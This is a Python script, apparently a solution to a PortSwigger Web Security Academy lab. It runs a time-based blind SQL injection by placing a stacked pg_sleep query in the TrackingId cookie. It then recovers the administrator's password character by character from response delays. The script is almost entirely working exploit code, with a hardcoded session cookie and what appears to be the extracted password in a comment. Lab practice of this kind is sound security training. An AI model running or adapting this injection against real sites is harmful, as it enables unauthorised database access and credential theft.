
import requests
import re
import string
import os

# splchars = list()

# for i in range(32,47):
#     splchars.append(chr(i))

#charactors = string.ascii_letters + string.digits + "".join(splchars)
# print(charactors)
charactors = string.ascii_lowercase + string.digits 

seen_password = list()

offset = 1

# trying area
# url = 'https://ac401fde1e14b7a1803042ca00730009.web-security-academy.net'
# cookies = dict(TrackingId="a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='q')+then+pg_sleep(5)+else+null+end+from+users--" , session='D9kvNWIdKpVgXMoT63qJyfvx4K3fhU7G')       
# r = requests.get(url,  cookies=cookies)
# response = r.elapsed.total_seconds()
# print(response)



while (True):
    for ch in charactors:
        url = 'https://ac401fde1e14b7a1803042ca00730009.web-security-academy.net'
        cookies = dict(TrackingId="a'%3bselect+case+when+(username='administrator'+and+substring(password,"+ str(offset) +",1)='" + ch + "')+then+pg_sleep(5)+else+null+end+from+users--" , session='D9kvNWIdKpVgXMoT63qJyfvx4K3fhU7G')       
        r = requests.get(url,  cookies=cookies)
        response = r.elapsed.total_seconds()
        os.system('cls')
        print("trying with password :- ", "".join(seen_password) + ch)
        if ( len(seen_password) != 20):
            if (response > 5):
                seen_password.append(ch)
                print("[+] Found password charectors till now - ",seen_password)
                offset = offset + 1
                break
        else:
            print("[+] Found Password ", "".join(seen_password))

#qm3pjd1yrqqm5vmfwh4s